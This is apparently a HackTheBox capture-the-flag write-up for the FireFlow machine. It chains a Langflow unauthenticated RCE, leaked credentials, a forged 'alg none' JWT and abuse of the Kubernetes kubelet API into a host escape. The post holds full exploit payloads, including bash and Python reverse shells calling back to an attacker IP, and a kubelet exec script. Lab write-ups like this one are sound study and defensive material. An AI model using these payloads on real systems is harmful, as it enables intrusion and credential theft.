---
title: "HTB FireFlow — Langflow RCE, JWT None Attack & Kubernetes Pod Escape"
date: 2026-06-28
categories: [HackTheBox, Linux]
tags: [htb, linux, langflow, kubernetes, jwt, cve-2026-33017, mcp, kubelet, container-escape, k8s]
classes: wide
header:
  image: /assets/images/firefl0w.png
  teaser: /assets/images/firefl0w.png
---

<style>
p { text-align: justify; }
</style>

# HTB FireFlow

**Difficulty:** Medium  
**OS:** Linux (Kubernetes)  
**Platform:** HackTheBox  
**Category:** Web / Cloud / Container Escape  
**Status:** Retired

---

## Overview

FireFlow is a medium Linux machine that lives entirely in cloud infrastructure. The attack chain touches four different environments: a Langflow AI platform, a Kubernetes MCP server pod, the Kubernetes control plane, and the underlying host node. The entry point is an unauthenticated RCE in Langflow. From there, environment variables leak credentials, a JWT signature bypass gives admin access to an MCP server, a misconfigured Kubernetes service account with `nodes/proxy` permission exposes the kubelet API, and a privileged pod with the host filesystem mounted delivers the root flag.

A lot of layers. Clean chain once you understand how each one connects.

---

## Reconnaissance

### Nmap

```bash
nmap -sV -sS -T4 -A -Pn 10.129.244.214
```

```
PORT      STATE    SERVICE
22/tcp    open     SSH       OpenSSH 9.6p1
443/tcp   open     HTTPS     nginx
9100/tcp  filtered
30000+    filtered           Kubernetes NodePorts
```

HTTPS on 443 and Kubernetes NodePorts in the filtered range.

```bash
echo "10.129.244.214 fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts
```

---

### Web Enumeration

The main page at `https://fireflow.htb` is a "Task Force Nightfall" intelligence platform. A link in the page points to:

```
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

That's a Langflow instance (an open-source AI workflow builder). Version check:

```bash
curl -k https://flow.fireflow.htb/api/v1/version
```

```json
{"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
```

Langflow 1.8.2. There's a known unauthenticated RCE for this version.

---

## Initial Access — CVE-2026-33017 (Langflow Unauthenticated RCE)

### The Vulnerability

The `/api/v1/build_public_tmp/{flow_id}/flow` endpoint builds public flows without any authentication. The problem is it also accepts attacker-supplied flow data containing arbitrary Python code in node definitions, which gets passed directly to `exec()` with no sandboxing. The playground flow ID from the page is public and exploitable directly.

### Building the Payload

Twenty minutes of failed attempts came down entirely to quote escaping across four nested layers: curl, JSON, Python, and bash. The fix was simple. Write the payload to a file and use `-d @file.json`:

```bash
cat > exploit.json << 'EOF'
{
  "data": {
    "nodes": [{
      "id": "Exploit-002",
      "type": "genericNode",
      "position": {"x":0,"y":0},
      "data": {
        "id": "Exploit-002",
        "type": "ExploitComp",
        "node": {
          "template": {
            "code": {
              "type": "code",
              "required": true,
              "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.16.32/9001 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
              "name": "code"
            },
            "_type": "Component"
          },
          "description": "X",
          "base_classes": ["Data"],
          "display_name": "ExploitComp",
          "name": "ExploitComp",
          "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true}]
        }
      }
    }],
    "edges": []
  }
}
EOF
```

Start listener and fire:

```bash
nc -lvnp 9001

curl -sk -X POST \
  'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  -d @exploit.json
```

Shell received as `www-data`.

---

## User Pivot —> nightfall

### Environment Variable Leak

```bash
env 
```

```
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
```

```bash
cat /etc/passwd | grep sh$
# nightfall:x:...::/home/nightfall:/bin/bash
```

```bash
su nightfall
# Password: n1ghtm4r3_b4_n1ghtf4ll
```

```bash
cat ~/user.txt
[REDACTED]
```

**User flag captured.** ✅

---

## MCP Server Exploitation

### MCP Configuration

In nightfall's home directory:

```bash
cat ~/.mcp/config.json
```

```json
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

The MCP (Model Context Protocol) server on port 30080 allows registering custom tools like Python code that executes server-side. If we can register a tool, we get RCE inside the MCP pod.

---

### JWT "None" Algorithm Attack

The server uses JWT for authentication but never validates the signing algorithm. If you send a token with `"alg":"none"`, no signature verification happens and any payload gets accepted as valid. Classic vulnerability from JWT implementations that trust the algorithm field from the token itself instead of enforcing it server-side.

Forge an admin token:

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())
payload = b64url(json.dumps({"sub":"attacker","role":"admin"}).encode())
token   = f"{header}.{payload}."

print(token)
```

```
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9.
```

---

### Registering a Malicious Tool

```bash
ADMIN_JWT="eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9."

curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name": "shell",
    "description": "debug shell",
    "inputSchema": {"type":"object","properties":{}},
    "code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n    import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n    import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.16.32\",9001))\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
  }'
```

### Triggering It

```bash
nc -lvnp 9001

curl -s -X POST http://10.129.244.214:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

Shell received in the MCP pod as root.

---

## Kubernetes Privilege Escalation

### Service Account Enumeration

The MCP pod runs with a Kubernetes service account. The token is mounted automatically:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d
```

Service account: `mcp-sa` in the `default` namespace.

### Checking Permissions

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -sk -X POST "https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

Result: `nodes/proxy` with `get` verb.

`nodes/proxy` lets you proxy requests directly to the kubelet API on any node in the cluster. The kubelet runs as root and exposes endpoints for executing commands inside any pod on that node. This permission is effectively cluster admin.

---

### Finding a Privileged Pod

The kubelet API lists every pod on the node:

```bash
curl -sk "https://10.129.244.214:10250/pods" \
  -H "Authorization: Bearer $TOKEN" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    for c in item['spec']['containers']:
        csc = c.get('securityContext', {})
        vols = [v for v in item['spec'].get('volumes', []) if 'hostPath' in v]
        if csc.get('privileged') and vols:
            paths = [v['hostPath']['path'] for v in vols]
            print(f'[!] {item[\"metadata\"][\"namespace\"]}/{item[\"metadata\"][\"name\"]} - {c[\"name\"]} - {paths}')
"
```

```
[!] monitoring/prometheus-prometheus-node-exporter-nmntq - node-exporter - ['/', '/proc', '/sys']
```

The node exporter pod is privileged and has the entire host filesystem mounted at `/`. That's the target.

---

### Executing Commands in the Privileged Pod

The kubelet exposes a WebSocket exec endpoint. Used a Python script to interact with it:

```python
import asyncio, ssl, sys, websockets

NODE  = "10.129.244.214"
NS    = "monitoring"
POD   = "prometheus-prometheus-node-exporter-nmntq"
CNT   = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()

async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    args = "&".join(f"command={part}" for part in cmd_parts)
    url  = f"wss://{NODE}:10250/exec/{NS}/{POD}/{CNT}?output=1&error=1&{args}"

    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except:
            pass

asyncio.run(ws_exec(sys.argv[1].split()))
```

---

## Root Flag

The host filesystem is mounted at `/host` inside the privileged pod:

```bash
python3 /tmp/kube_exec.py "cat /host/root/root/root.txt"
```

```
[REDACTED]
```

**Root flag captured. Cluster pwned.** ✅

---

## Full Attack Chain

```
CVE-2026-33017: Langflow unauthenticated RCE
-> build_public_tmp endpoint, attacker-controlled Python in exec()
-> www-data shell
   |
   env leak: LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
   -> su nightfall -> USER FLAG
      |
      ~/.mcp/config.json -> MCP server at :30080
      |
      JWT "none" algorithm -> forged admin token
      -> register malicious tool -> trigger -> MCP pod shell (root)
         |
         /var/run/secrets/.../token -> mcp-sa service account
         -> nodes/proxy permission -> kubelet API access
            |
            kubelet /pods -> find privileged pod with host mount
            -> WebSocket exec -> prometheus node-exporter pod
               |
               /host/root/root/root.txt -> ROOT FLAG
```


## What Did We Learn?

**1. Public AI workflow endpoints should never accept arbitrary code**  
Langflow's `build_public_tmp` endpoint was designed for sharing flows publicly. Accepting attacker-supplied node definitions that reach `exec()` with no sandboxing turns every public flow into an RCE surface. AI platforms that execute user code need proper isolation.

**2. Environment variables are not a secret store**  
`LANGFLOW_SUPERUSER_PASSWORD` sitting in the process environment is readable by anyone with shell access to that container. Secrets belong in a secrets manager or mounted as files with tight permissions, not in env vars passed at container startup.

**3. JWT "none" is a 2015 vulnerability that still ships in production code**  
The server trusted the algorithm field from the token itself. An attacker sets `"alg":"none"`, drops the signature, and the server accepts it as valid. Always enforce a specific algorithm server-side and never accept what the token says.

**4. `nodes/proxy` in Kubernetes is cluster admin in disguise**  
This single permission lets you proxy directly to the kubelet on any node, exec into any pod, read any secret in any running container. It should appear on no service account that isn't explicitly meant to manage the cluster.

**5. Quote escaping across multiple layers needs file-based payloads**  
Curl -> JSON -> Python -> bash: four layers of escaping where a single wrong character breaks the whole chain. Writing the payload to a file and using `-d @file.json` removes the problem entirely. Use files for complex payloads.

**6. Privileged pods with host path mounts are a complete container escape**  
The node exporter pod was privileged and had `/` mounted from the host. Once you exec into it, there is no container boundary. You're reading the host filesystem directly. Monitoring workloads should never run privileged unless there is absolutely no alternative, and even then they shouldn't mount `/`.

---

<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZWx6anlsazVkNndjdHAwemJ4c2NiNDFjenhzZXdkNjhrdmJ3dmg4NCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/15UbO1LY4O2Fxw8gnI/giphy.gif"
     style="width: 100%; height: auto;"
     alt="pwned">

*Written by 0x5h4q | [0x5h4q.github.io](https://0x5h4q.github.io)*
